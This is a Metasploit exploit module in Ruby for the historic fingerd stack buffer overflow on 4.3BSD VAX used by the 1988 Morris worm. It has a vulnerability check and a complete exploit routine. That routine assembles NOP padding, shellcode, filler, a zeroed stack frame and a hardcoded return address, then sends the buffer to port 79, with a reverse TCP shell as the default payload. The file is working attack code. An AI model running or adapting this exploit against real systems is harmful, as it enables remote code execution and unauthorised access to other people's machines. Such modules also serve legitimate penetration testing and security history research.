# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  # This is so one-off that we define it here
  ARCH_VAX = &#039;vax&#039;

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;              => &#039;Morris Worm fingerd Stack Buffer Overflow&#039;,
      &#039;Description&#039;       => %q{
        This module exploits a stack buffer overflow in fingerd on 4.3BSD.
        This vulnerability was exploited by the Morris worm in 1988-11-02.
        Cliff Stoll reports on the worm in the epilogue of The Cuckoo&#039;s Egg.
      },
      &#039;Author&#039;            => [
        &#039;Robert Tappan Morris&#039;, # Discovery? Exploit and worm for sure
        &#039;Cliff Stoll&#039;,          # The Cuckoo&#039;s Egg epilogue and inspiration
        &#039;wvu&#039;                   # Module, payload, and additional research
      ],
      &#039;References&#039;        => [
        [&#039;URL&#039;, &#039;https://en.wikipedia.org/wiki/Morris_worm&#039;],         # History
        [&#039;URL&#039;, &#039;https://spaf.cerias.purdue.edu/tech-reps/823.pdf&#039;],  # Analysis
        [&#039;URL&#039;, &#039;http://computerarcheology.com/Virus/MorrisWorm/&#039;],   # Details
        [&#039;URL&#039;, &#039;https://github.com/arialdomartini/morris-worm&#039;],     # Source
        [&#039;URL&#039;, &#039;http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH&#039;] # Setup
        # And credit to the innumerable VAX ISA docs on the Web
      ],
      &#039;DisclosureDate&#039;    => &#039;Nov 2 1988&#039;,
      &#039;License&#039;           => MSF_LICENSE,
      &#039;Platform&#039;          => &#039;bsd&#039;,
      &#039;Arch&#039;              => ARCH_VAX,
      &#039;Privileged&#039;        => false, # Depends on inetd.conf, usually "nobody"
      &#039;Targets&#039;           => [
        # https://en.wikipedia.org/wiki/Source_Code_Control_System
        [&#039;@(#)fingerd.c   5.1 (Berkeley) 6/6/85&#039;,
          &#039;Ret&#039;           => 0x7fffe9b0,
          &#039;Payload&#039;       => {
            &#039;Space&#039;       => 403,
            &#039;BadChars&#039;    => "\n",
            &#039;Encoder&#039;     => &#039;generic/none&#039;, # There is no spoon
            &#039;DisableNops&#039; => true            # Hardcoded NOPs
          }
        ]
      ],
      &#039;DefaultTarget&#039;     => 0,
      &#039;DefaultOptions&#039;    => {&#039;PAYLOAD&#039; => &#039;bsd/vax/shell_reverse_tcp&#039;}
    ))

    register_options([Opt::RPORT(79)])
  end

  def check
    token = rand_text_alphanumeric(8..42)

    connect
    sock.put("#{token}\n")
    res = sock.get_once

    return CheckCode::Unknown unless res

    if res.include?("Login name: #{token}")
      return CheckCode::Detected
    end

    CheckCode::Safe
  rescue Rex::ConnectionError => e
    vprint_error(e.message)
    CheckCode::Unknown
  ensure
    disconnect
  end

  def exploit
    # Start by generating our custom VAX shellcode
    shellcode = payload.encoded

    # 0x01 is NOP in VAX-speak
    nops = "\x01" * (target.payload_space - shellcode.length)

    # This overwrites part of the buffer
    junk = rand_text_alphanumeric(109)

    # This zeroes out part of the stack frame
    frame = "\x00" * 16

    # Finally, pack in our return address
    ret  = [target.ret].pack(&#039;V&#039;) # V is for VAX!

    # The newline is for gets(3)
    sploit = nops + shellcode + junk + frame + ret + "\n"

    # Fire away
    print_status(&#039;Connecting to fingerd&#039;)
    connect
    print_status("Sending #{sploit.length}-byte buffer")
    sock.put(sploit)

  # Hat tip @bcoles
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  ensure
    disconnect
  end

end

